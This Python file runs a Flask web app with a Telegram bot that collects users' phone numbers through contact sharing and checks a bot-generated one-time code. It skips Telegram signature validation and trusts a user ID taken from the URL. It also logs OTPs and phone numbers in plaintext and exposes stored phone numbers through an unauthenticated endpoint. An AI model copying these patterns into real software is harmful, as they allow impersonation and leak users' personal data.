import os
import telebot
from telebot import types
from flask import Flask, render_template, request, jsonify
import logging
from datetime import datetime
import threading
import time
import json
import random
import uuid
from flask_cors import CORS
import requests
import traceback

# ==================== SETUP ====================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)
app.secret_key = os.environ.get("SECRET_KEY", "telegram-webapp-secret-key-2024")

# Configuration - Render will provide PORT
PORT = int(os.environ.get('PORT', 10000))

# Get domain automatically
if 'RENDER' in os.environ:
    # Running on Render
    RENDER_EXTERNAL_HOSTNAME = os.environ.get('RENDER_EXTERNAL_HOSTNAME')
    if RENDER_EXTERNAL_HOSTNAME:
        WEBAPP_URL = f"https://{RENDER_EXTERNAL_HOSTNAME}"
    else:
        WEBAPP_URL = os.environ.get('WEBAPP_URL', 'https://itz-me-545-telegram.onrender.com')
else:
    # Local development
    WEBAPP_URL = os.environ.get('WEBAPP_URL', f'http://localhost:{PORT}')

BOT_TOKEN = os.environ.get("BOT_TOKEN", "")
ADMIN_ID = os.environ.get("ADMIN_ID", "")

if not BOT_TOKEN:
    logger.error("❌ BOT_TOKEN is not set in environment variables!")
    exit(1)

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='HTML')

# Get bot info
try:
    bot_info = bot.get_me()
    BOT_USERNAME = bot_info.username
    BOT_NAME = bot_info.first_name
    logger.info(f"🤖 Bot initialized: {BOT_NAME} (@{BOT_USERNAME})")
except Exception as e:
    logger.error(f"Failed to get bot info: {e}")
    BOT_USERNAME = "your_bot"
    BOT_NAME = "Verification Bot"

# Session storage
sessions = {}
SESSION_FILE = "sessions.json"
session_timeout = 600

# ==================== WEBHOOK SETUP ====================
def setup_webhook():
    """Setup Telegram webhook automatically"""
    webhook_url = f"{WEBAPP_URL.rstrip('/')}/webhook"
    
    try:
        # Remove existing webhook
        bot.remove_webhook()
        time.sleep(0.5)
        
        # Set new webhook
        result = bot.set_webhook(url=webhook_url)
        
        if result:
            logger.info(f"✅ Webhook set successfully: {webhook_url}")
            
            # Test webhook info
            try:
                webhook_info = bot.get_webhook_info()
                logger.info(f"📊 Webhook Info: {webhook_info.url}")
                logger.info(f"📊 Pending updates: {webhook_info.pending_update_count}")
                
                # Notify admin
                if ADMIN_ID:
                    bot.send_message(ADMIN_ID, f"✅ Bot started with webhook!\n\n🌐 URL: {WEBAPP_URL}\n🤖 Bot: @{BOT_USERNAME}\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
                    
            except Exception as e:
                logger.error(f"Webhook info error: {e}")
                
            return True
        else:
            logger.error("❌ Failed to set webhook")
            return False
            
    except Exception as e:
        logger.error(f"❌ Webhook setup error: {str(e)}")
        logger.error(traceback.format_exc())
        return False

# ==================== SESSION MANAGEMENT ====================
def load_sessions():
    """Load sessions from file"""
    global sessions
    try:
        if os.path.exists(SESSION_FILE):
            with open(SESSION_FILE, 'r') as f:
                saved_sessions = json.load(f)
                for sid, session_data in saved_sessions.items():
                    for key, value in session_data.items():
                        if key in ['created', 'last_activity'] and value:
                            session_data[key] = datetime.fromisoformat(value)
                sessions = saved_sessions
                logger.info(f"📂 Loaded {len(sessions)} sessions from file")
    except Exception as e:
        logger.error(f"Error loading sessions: {e}")
        sessions = {}

def save_sessions():
    """Save sessions to file"""
    try:
        sessions_to_save = {}
        for sid, session_data in sessions.items():
            sessions_to_save[sid] = session_data.copy()
            for key in ['created', 'last_activity']:
                if key in sessions_to_save[sid] and sessions_to_save[sid][key]:
                    if isinstance(sessions_to_save[sid][key], datetime):
                        sessions_to_save[sid][key] = sessions_to_save[sid][key].isoformat()
        
        with open(SESSION_FILE, 'w') as f:
            json.dump(sessions_to_save, f, indent=2)
    except Exception as e:
        logger.error(f"Error saving sessions: {e}")

def create_session(user_id, user_data=None):
    """Create a new session"""
    session_id = str(uuid.uuid4())
    
    sessions[session_id] = {
        'session_id': session_id,
        'user_id': user_id,
        'user_data': user_data,
        'created': datetime.now(),
        'status': 'active',
        'phone': None,
        'otp_code': None,
        'otp_sent': False,
        'otp_verified': False,
        'contact_shared': False,
        'last_activity': datetime.now()
    }
    
    save_sessions()
    logger.info(f"✅ Created session {session_id} for user {user_id}")
    return session_id

def get_session(session_id):
    """Get session by ID"""
    if session_id in sessions:
        session = sessions[session_id]
        
        # Check expiration
        if isinstance(session['created'], str):
            session['created'] = datetime.fromisoformat(session['created'])
        
        time_diff = (datetime.now() - session['created']).total_seconds()
        if time_diff > session_timeout:
            logger.info(f"🗑️ Session expired: {session_id}")
            del sessions[session_id]
            save_sessions()
            return None
        
        session['last_activity'] = datetime.now()
        return session
    
    return None

def get_session_by_user(user_id):
    """Get session by user ID"""
    for session_id, session in sessions.items():
        if str(session['user_id']) == str(user_id):
            return session
    return None

def update_session(session_id, updates):
    """Update session data"""
    if session_id in sessions:
        sessions[session_id].update(updates)
        sessions[session_id]['last_activity'] = datetime.now()
        save_sessions()
        return True
    return False

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    """Main page"""
    return render_template('index.html',
                         bot_username=BOT_USERNAME,
                         webapp_url=WEBAPP_URL)

@app.route('/verify')
def verify_page():
    """Verification page with Telegram WebApp data"""
    # Try to get initData from Telegram WebApp
    init_data_raw = request.args.get('tgWebAppData', '')
    
    # Parse Telegram WebApp data
    user_data = parse_telegram_data(init_data_raw)
    
    if user_data and 'user' in user_data:
        # User opened from Telegram WebApp
        user_id = user_data['user'].get('id')
        first_name = user_data['user'].get('first_name', '')
        username = user_data['user'].get('username', '')
        photo_url = user_data['user'].get('photo_url', '')
        
        logger.info(f"🌐 WebApp opened by user {user_id} (@{username})")
        
        # Create or get session
        session = get_session_by_user(user_id)
        if not session:
            session_id = create_session(user_id, user_data)
            session = get_session(session_id)
        else:
            session_id = session['session_id']
            # Update user data if needed
            update_session(session_id, {'user_data': user_data})
        
        return render_template('verify.html',
                             session_id=session_id,
                             user_id=user_id,
                             user_data=user_data,
                             bot_username=BOT_USERNAME)
    
    else:
        # No WebApp data - maybe opened directly
        user_id = request.args.get('user_id')
        
        if not user_id:
            return render_template('error.html',
                                 error="Access Denied",
                                 message="Please open this page from Telegram bot",
                                 bot_username=BOT_USERNAME)
        
        # Create or get session
        session = get_session_by_user(user_id)
        if not session:
            session_id = create_session(user_id)
        else:
            session_id = session['session_id']
        
        logger.info(f"🌐 Verify page accessed - User: {user_id}, Session: {session_id}")
        
        return render_template('verify.html',
                             session_id=session_id,
                             user_id=user_id,
                             bot_username=BOT_USERNAME)

@app.route('/otp')
def otp_page():
    """OTP entry page"""
    session_id = request.args.get('session_id')
    
    if not session_id:
        return render_template('error.html',
                             error="Session Required",
                             message="Please share contact first",
                             bot_username=BOT_USERNAME)
    
    session = get_session(session_id)
    if not session or not session.get('otp_sent'):
        return render_template('error.html',
                             error="Contact Not Shared",
                             message="Please share your contact first",
                             bot_username=BOT_USERNAME)
    
    phone = session.get('phone', 'Unknown')
    masked_phone = phone[:4] + '****' + phone[-3:] if len(phone) > 7 else phone
    
    logger.info(f"🔢 OTP page accessed - Session: {session_id}, Phone: {masked_phone}")
    
    return render_template('otp.html',
                         session_id=session_id,
                         phone=masked_phone,
                         bot_username=BOT_USERNAME)

@app.route('/success')
def success_page():
    """Success page"""
    session_id = request.args.get('session_id')
    
    if session_id:
        session = get_session(session_id)
        if session and session.get('otp_verified'):
            logger.info(f"🎉 Success page - Verified user: {session.get('user_id')}")
            
            # Get user data for display
            user_data = session.get('user_data', {})
            user_info = user_data.get('user', {}) if user_data else {}
            
            return render_template('success.html',
                                 phone=session.get('phone'),
                                 user_info=user_info,
                                 bot_username=BOT_USERNAME)
    
    return render_template('error.html',
                         error="Verification Required",
                         message="Please complete verification",
                         bot_username=BOT_USERNAME)

# ==================== TELEGRAM DATA PARSING ====================
def parse_telegram_data(init_data_raw):
    """Parse Telegram WebApp initData"""
    if not init_data_raw:
        return None
    
    try:
        # Simple parsing (for demo - in production validate signature)
        params = {}
        for pair in init_data_raw.split('&'):
            key, value = pair.split('=', 1)
            params[key] = value
        
        # Parse user data
        if 'user' in params:
            import urllib.parse
            user_json = urllib.parse.unquote(params['user'])
            user_data = json.loads(user_json)
            
            return {
                'user': user_data,
                'auth_date': params.get('auth_date'),
                'hash': params.get('hash')
            }
    except Exception as e:
        logger.error(f"Error parsing Telegram data: {e}")
    
    return None

# ==================== API ENDPOINTS ====================
@app.route('/api/process-contact', methods=['POST'])
def api_process_contact():
    """Process contact from WebApp"""
    try:
        data = request.json
        session_id = data.get('session_id')
        phone = data.get('phone')
        user_id = data.get('user_id')
        
        logger.info(f"📱 Processing contact - Session: {session_id}")
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone number required'})
        
        # Get session
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session not found'})
        
        # Normalize phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Generate OTP
        otp_code = str(random.randint(100000, 999999))
        
        # Update session
        update_session(session_id, {
            'phone': phone,
            'otp_code': otp_code,
            'otp_sent': True,
            'contact_shared': True,
            'status': 'contact_received'
        })
        
        # Send OTP to user via Telegram
        try:
            chat_id = session.get('user_id')
            if chat_id:
                bot.send_message(
                    chat_id,
                    f"""✅ <b>Contact Received!</b>

📱 Phone: {phone}
🔢 OTP: <code>{otp_code}</code>

Enter this code in the WebApp to verify your account.

⚠️ <i>Do not share this code with anyone.</i>""",
                    parse_mode='HTML'
                )
                logger.info(f"📨 OTP sent to user {chat_id}: {otp_code}")
        except Exception as e:
            logger.error(f"Failed to send OTP: {e}")
        
        return jsonify({
            'success': True,
            'message': 'OTP sent successfully',
            'session_id': session_id
        })
        
    except Exception as e:
        logger.error(f"Error processing contact: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/check-session/<session_id>', methods=['GET'])
def api_check_session(session_id):
    """Check session status"""
    try:
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        session = get_session(session_id)
        if session:
            return jsonify({
                'success': True,
                'session': {
                    'session_id': session_id,
                    'user_id': session.get('user_id'),
                    'phone': session.get('phone'),
                    'contact_shared': session.get('contact_shared'),
                    'otp_sent': session.get('otp_sent'),
                    'otp_verified': session.get('otp_verified')
                }
            })
        
        return jsonify({'success': False, 'error': 'Session not found'})
    except Exception as e:
        logger.error(f"Error checking session: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def api_verify_otp():
    """Verify OTP"""
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '').strip()
        
        if not session_id:
            return jsonify({'success': False, 'error': 'Session ID required'})
        
        if not otp or len(otp) != 6:
            return jsonify({'success': False, 'error': 'Invalid OTP'})
        
        session = get_session(session_id)
        if not session:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if session.get('otp_code') == otp:
            update_session(session_id, {
                'otp_verified': True,
                'status': 'verified'
            })
            
            logger.info(f"🎉 OTP verified for session: {session_id}")
            
            return jsonify({
                'success': True,
                'message': 'Verification successful!',
                'redirect': f'/success?session_id={session_id}'
            })
        else:
            return jsonify({
                'success': False,
                'error': 'Invalid OTP code'
            })
        
    except Exception as e:
        logger.error(f"Error verifying OTP: {str(e)}")
        return jsonify({'success': False, 'error': str(e)})

# ==================== WEBHOOK ENDPOINT ====================
@app.route('/webhook', methods=['POST'])
def webhook():
    """Telegram webhook endpoint"""
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        
        try:
            bot.process_new_updates([update])
            return 'OK', 200
        except Exception as e:
            logger.error(f"Error processing update: {e}")
            return 'Error', 500
    return 'Bad Request', 400

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle /start command"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        first_name = message.from_user.first_name or ""
        username = message.from_user.username or ""
        
        logger.info(f"📨 /start from {user_id} (@{username})")
        
        # Create WebApp URL with user data
        webapp_url = f"{WEBAPP_URL.rstrip('/')}/verify?user_id={user_id}"
        
        # Create keyboard with WebApp button
        keyboard = types.InlineKeyboardMarkup()
        webapp_button = types.InlineKeyboardButton(
            text="🔐 Open Verification WebApp",
            web_app=types.WebAppInfo(url=webapp_url)
        )
        keyboard.add(webapp_button)
        
        # Welcome message
        welcome_text = f"""<b>👋 Hello {first_name}!</b>

Welcome to <b>{BOT_NAME}</b> (@{BOT_USERNAME})

Tap the button below to verify your account:

1️⃣ Open WebApp
2️⃣ Tap "Share Contact"
3️⃣ Select your contact
4️⃣ Receive OTP here
5️⃣ Enter OTP in WebApp
6️⃣ Verification complete ✅

Your contact will be auto-deleted after verification.

<i>Session: {user_id}</i>"""
        
        bot.send_message(
            chat_id,
            welcome_text,
            parse_mode="HTML",
            reply_markup=keyboard
        )
        
        logger.info(f"✅ Responded to /start for {user_id}")
        
    except Exception as e:
        logger.error(f"Error in /start: {str(e)}")
        try:
            bot.send_message(message.chat.id, "⚠️ Something went wrong. Please try again.")
        except:
            pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Handle contact sharing"""
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if not message.contact:
            return
        
        contact = message.contact
        phone = contact.phone_number
        
        logger.info(f"📞 Contact received from {user_id}: {phone}")
        
        # Normalize phone
        if not phone.startswith('+'):
            phone = '+' + phone
        
        # Find session
        session = get_session_by_user(user_id)
        if not session:
            # Create session if not exists
            session_id = create_session(user_id)
            session = get_session(session_id)
        
        # Generate OTP
        otp_code = str(random.randint(100000, 999999))
        
        # Update session
        update_session(session['session_id'], {
            'phone': phone,
            'otp_code': otp_code,
            'otp_sent': True,
            'contact_shared': True,
            'status': 'contact_received'
        })
        
        # Send OTP to user
        otp_message = f"""✅ <b>Contact Received Successfully!</b>

📱 Phone: {phone}
👤 Name: {contact.first_name or ''} {contact.last_name or ''}

🔢 <b>Your OTP Code:</b> <code>{otp_code}</code>

Return to WebApp and enter this code to complete verification.

<b>Session ID:</b> <code>{session['session_id']}</code>

⚠️ <i>This code will expire in 10 minutes.</i>"""
        
        bot.send_message(chat_id, otp_message, parse_mode='HTML')
        
        # Delete contact message for privacy
        try:
            bot.delete_message(chat_id, message.message_id)
        except:
            pass
        
        logger.info(f"✅ OTP {otp_code} sent to {user_id}")
        
    except Exception as e:
        logger.error(f"Error handling contact: {str(e)}")
        try:
            bot.send_message(message.chat.id, "⚠️ Error processing contact. Please try again.")
        except:
            pass

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        user_id = message.from_user.id
        
        # Only respond to non-command messages
        if not message.text.startswith('/'):
            help_text = f"""<b>📋 How to verify:</b>

1. Open WebApp by clicking the button from /start
2. Tap "Share Contact" in WebApp
3. Select your contact from Telegram
4. OTP will appear here
5. Enter OTP in WebApp
6. Verification complete!

Need help? Use /start to begin."""
            
            bot.send_message(message.chat.id, help_text, parse_mode='HTML')
            
    except Exception as e:
        logger.error(f"Error handling message: {e}")

# ==================== CLEANUP THREAD ====================
def cleanup_sessions():
    """Clean up expired sessions"""
    while True:
        try:
            current_time = datetime.now()
            expired_sessions = []
            
            for session_id, session in sessions.items():
                if isinstance(session.get('created'), str):
                    session['created'] = datetime.fromisoformat(session['created'])
                
                time_diff = (current_time - session['created']).total_seconds()
                if time_diff > session_timeout:
                    expired_sessions.append(session_id)
            
            for session_id in expired_sessions:
                del sessions[session_id]
            
            if expired_sessions:
                save_sessions()
                logger.info(f"🧹 Cleaned {len(expired_sessions)} expired sessions")
            
            time.sleep(60)
            
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
            time.sleep(60)

# ==================== MAIN ====================
if __name__ == '__main__':
    # Startup info
    logger.info("="*50)
    logger.info("🚀 TELEGRAM VERIFICATION BOT")
    logger.info("="*50)
    logger.info(f"🤖 Bot: @{BOT_USERNAME}")
    logger.info(f"🌐 WebApp URL: {WEBAPP_URL}")
    logger.info(f"🔧 Port: {PORT}")
    logger.info("="*50)
    
    # Load sessions
    load_sessions()
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_sessions, daemon=True)
    cleanup_thread.start()
    logger.info("✅ Cleanup thread started")
    
    # Setup webhook
    webhook_setup = setup_webhook()
    
    if webhook_setup:
        logger.info("✅ Webhook setup completed")
        logger.info("✅ Bot is ready to receive updates via webhook")
    else:
        logger.error("❌ Webhook setup failed!")
        logger.info("⚠️ Running in polling mode as fallback")
        # Start polling as fallback
        bot.remove_webhook()
        time.sleep(1)
        polling_thread = threading.Thread(
            target=bot.polling,
            kwargs={'none_stop': True, 'interval': 2, 'timeout': 30},
            daemon=True
        )
        polling_thread.start()
    
    # Start Flask app
    logger.info(f"✅ Starting Flask on port {PORT}")
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=False,
        use_reloader=False,
        threaded=True
        )
